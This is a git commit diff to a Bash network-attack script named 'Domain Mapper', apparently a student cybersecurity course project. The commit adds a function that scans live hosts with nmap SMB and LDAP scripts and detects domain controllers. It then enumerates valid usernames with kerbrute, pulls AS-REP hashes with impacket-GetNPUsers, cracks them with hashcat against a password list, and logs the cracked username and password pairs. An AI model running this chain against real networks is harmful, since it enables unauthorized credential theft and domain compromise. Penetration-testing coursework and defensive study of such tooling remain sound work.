bf50d9374e5cbaf929cec7ecdd0fba7dd543cdd9
cyberdayag <a.shev4uk1975@gmail.com>
2025-09-27 17:57:15 -0400

    Refactor(Enumeration): improve Enumeration flow; partial 3.3 (Advanced) implementation

--- TMagen773637.s21.ZX305.sh
+++ TMagen773637.s21.ZX305.sh
@@ -71,10 +71,6 @@ START() {
     figlet "DOMAIN MAPPER"         # Display banner
     echo -e "\nOleksandr Shevchuk S21, TMagen773637\n"
 
-    # Prepare world lists directory
-    data="$current_dir/world_lists"
-    mkdir -p "$data"
-
     # Check internet and required utilities
     CHECK_INTERNET_CONNECTION
 }
@@ -110,15 +106,23 @@ CHECK_INTERNET_CONNECTION() {
 # If a utility is missing, it attempts to install it using 'apt'.
 CHECK_APP() {
     # List of utilities to check (excluding aria2c, handled separately)
-    local utilities_for_check="ftp nmap rdesktop ssh sshpass fping enscript"
+    local utilities_for_check="ftp nmap rdesktop ssh sshpass fping enscript kerbrute"
     
     # Iterate through the list and verify each utility
     for i in $utilities_for_check; do
         if ! command -v "$i" > /dev/null 2>&1; then
-
-            # Utility not found, attempt installation
-            echo -e "\e[91m\e[107m[!] '$i' is not installed.\e[0m"
-            apt install "$i" -y || { echo -e "\e[91m\e[107m[!] Failed to install '$i'.\e[0m"; exit 1; }
+           if [ "$i" = "kerbrute" ]; then
+                # Utility not found, attempt installation
+                echo -e "\e[91m\e[107m[!] kerbrute is not installed.\e[0m"
+                wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64
+                chmod +x kerbrute_linux_amd64
+                mv kerbrute_linux_amd64 /usr/local/bin/kerbrute
+                hash -r
+            else
+                # Utility not found, attempt installation
+                echo -e "\e[91m\e[107m[!] '$i' is not installed.\e[0m"
+                apt install "$i" -y || { echo -e "\e[91m\e[107m[!] Failed to install '$i'.\e[0m"; exit 1; }
+            fi
         else
             # Utility is already installed
             echo -e "\e[32m[✔] $i\e[0m"
@@ -143,7 +147,8 @@ SELECT_SCAN_METOD() {
 
     if [[ ! "$network" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+/[0-9]+$ ]]; then
         echo -e "\e[91m[!] Wrong format. Example: 192.168.0.0/24\e[0m\n"
-        SELECT_SCAN_METOD    
+        SELECT_SCAN_METOD
+        return
     fi
 
     local mode_name="scanning"
@@ -179,6 +184,7 @@ SELECT_SCAN_METOD() {
             echo -e "\n\e[31m[!]\e[0m\e[32m Searching for live hosts...\e[0m"
             fping -a -g "$network" 2>/dev/null | awk '{print $1}' | grep -v $(hostname -I | awk '{print $1}') > "$working_dir/live_hosts.txt" &
             SPINNER $!
+            wait
 
             # Run the selected scan
             if [[ "$level" == "Basic_$mode_name" ]]; then
@@ -314,13 +320,13 @@ ENUMERATION_MODE_SELECTOR() {
         elif
             [[ "$user_choice" =~ ^[Aa]$ ]]; then
 
-            echo -e "\n\e[31m============================================================"
+            echo -e "\n\e[31m===================================================================="
             echo -e "   ⚠️  ATTENTION: Advanced Enumeration Requirements  ⚠️"
-            echo -e "============================================================"
+            echo -e "===================================================================="
             echo -e " Userlist AND Password List are REQUIRED."
             echo -e " - If no custom userlist is provided, default userlist will be used."
             echo -e " - If no custom password list is provided, rockyou.txt will be used."
-            echo -e "============================================================\e[0m\n"
+            echo -e "====================================================================\e[0m\n"
             sleep 2
             
             # Prompt the user to enter the full path to a  userlist
@@ -468,6 +474,82 @@ INTERMEDIATE_ENUMERATION() {
 }
 
 
+# ADVANCED_ENUMERATION
+
+ADVANCED_ENUMERATION() {
+    for target_ip in $(cat "$working_dir/live_hosts.txt"); do
+        host_dir="$working_dir/${target_ip}"
+        scan_result_txt="$host_dir/result_${target_ip}.txt"
+
+        echo -e "\e[31m[*]\e[0m\e[32m Enumeration: ${target_ip}\e[0m"
+        echo -e "\nADVANCED ENUMERATION RESULT FOR ${target_ip}\n" >> "$scan_result_txt" 2>/dev/null
+
+        tcp_ports=""
+        udp_ports=""
+
+        if grep -q '/tcp' "$scan_result_txt"; then
+            tcp_ports=$(grep '/tcp' "$scan_result_txt" | awk -F'/' '{print $1}' | paste -sd, -)
+        fi
+
+        if grep -q '/udp' "$scan_result_txt"; then
+            udp_ports=$(grep '/udp' "$scan_result_txt" | awk -F'/' '{print $1}' | paste -sd, -)
+        fi
+
+        common_ports="21,22,139,445,389,636,3389,5985,5986"
+        all_ports=$(echo "$tcp_ports,$udp_ports,$common_ports" | tr ',' '\n' | grep -v '^$' | sort -n -u | paste -sd, -)
+
+        if [ -n "$all_ports" ]; then
+            nmap -Pn -sV -p "$all_ports" "$target_ip" -oN - 2>/dev/null | grep -E '^PORT|/tcp|open'| grep -i -v 'filtered' >> "$scan_result_txt" 2>/dev/null &
+            SPINNER $!
+            wait
+        fi
+
+        nmap -Pn -sV -p "$common_ports" --script smb-os-discovery,smb-enum-shares,smb-enum-users,ldap-search,smb-enum-domains,nbstat "$target_ip" 2>/dev/null | awk 'NR>3' | grep -i -v 'filtered' >> "$scan_result_txt" 2>/dev/null &
+        SPINNER $!
+        wait
+
+        if grep -q "ldap.*Active Directory" "$scan_result_txt" && grep -q "88/tcp" "$scan_result_txt" && grep -q "3268/tcp" "$scan_result_txt"; then
+            msg="[+] DOMAIN CONTROLLER DETECTED ${target_ip}"
+            echo -e "\n$msg\n" >> "$scan_result_txt" 2>/dev/null
+            echo -e "\e[33m$msg\e[0m"
+
+            domain=$(grep -i 'domain' "$scan_result_txt" | awk -F 'Domain:' '{print $2}' | awk -F ',' '{print $1}' | grep -v '^[[:space:]]*$' | head -1 | xargs)
+            
+            kerbrute userenum  -d "$domain" --dc "${target_ip}" "$userlist" | grep VALID | awk '{print "VALID USERNAME  " $NF}' | sed 's/\x1b\[[0-9;]*m//g' >> "$scan_result_txt"
+
+            hashes_file="$host_dir/hash_${target_ip}.txt"
+            impacket-GetNPUsers "$domain"/ -usersfile "$userlist" -dc-ip ${target_ip} -format hashcat | grep -i '$krb' >> "$hashes_file"
+            
+            credentials="$host_dir/creds_${target_ip}.txt"
+            hashcat -m 18200 -a 0 "$hashes_file" "$passwdlist" >> "$credentials" --potfile-disable &
+            SPINNER $!
+            wait
+
+            if [ -s "$credentials" ]; then
+                # Загружаем только строки, содержащие литерал "$krb", в массив lines
+                # Используем grep -F для буквального поиска '$krb'
+                mapfile -t lines < <(grep -F '$krb' "$credentials" 2>/dev/null || true)
+
+                # Проходим по массиву через for (как ты просил)
+                for line in "${lines[@]}"; do
+                    brut_user=$(echo "$line" | awk -F '@' '{print $1}' | awk -F '$' '{print $NF}' | xargs) 2>/dev/null
+                    brut_passwd=$(echo "$line"| awk -F '@' '{print $2}' | awk -F ':' '{print $NF}' | xargs) 2>/dev/null
+                    pair="$brut_user:$brut_passwd" 
+                    echo -e "\n[+] CREDENTIALS FOUND $pair" >> "$scan_result_txt" 2>/dev/null
+                done
+            fi
+        fi
+    done
+
+    interface=$(ip -o -4 addr show up | awk '!/lo/ {print $2; exit}')
+    dhcp_output=$(nmap -e "$interface" --script broadcast-dhcp-discover 2>/dev/null)
+    if echo "$dhcp_output" | grep -q "Server Identifier:"; then
+        dhcp_ip=$(echo "$dhcp_output" | grep "Server Identifier:" | awk -F ':' '{print $NF}' | tr -d ' ')
+        msg="[+] DHCP SERVER DETECTED ${dhcp_ip}"
+        echo -e "\n$msg" >> "$scan_result_txt" 2>/dev/null
+        echo -e "\e[33m$msg\e[0m"
+    fi
+}
 
 
 # STOP - Stops the Nipe service, restores original IP and MAC address, and cleans up.
